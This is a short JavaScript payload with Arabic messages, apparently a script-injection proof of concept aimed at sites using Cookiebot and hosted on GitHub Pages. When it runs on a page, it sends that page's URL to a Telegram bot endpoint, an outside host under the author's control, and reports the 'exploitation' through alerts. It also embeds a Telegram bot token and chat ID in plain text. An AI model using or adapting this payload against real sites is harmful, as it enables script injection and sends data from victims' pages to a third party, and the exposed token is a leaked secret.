console.log("🚨 محاولة إرسال إلى تليجرام...");

try {
  fetch("https://api.telegram.org/bot7418874172:AAFy2mvuxosCEGJEKUls4EoXaSIcjfJ82Ac/sendMessage", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: "6929699769",
      text: "🚨 Cookiebot تم استغلاله في: " + location.href
    })
  })
  .then(res => res.text())
  .then(txt => {
    console.log("✅ رد تليجرام:", txt);
    alert("📬 تم إرسال الرسالة؟ راجع الكونسول!");
  })
  .catch(err => {
    console.error("❌ فشل الإرسال:", err);
    alert("❌ فشل إرسال رسالة تليجرام!");
  });
} catch (e) {
  console.error("❌ Error in fetch block:", e);
  alert("❌ استثناء أثناء محاولة الإرسال");
}

alert("🔥 تم تنفيذ السكربت من GitHub Pages!");
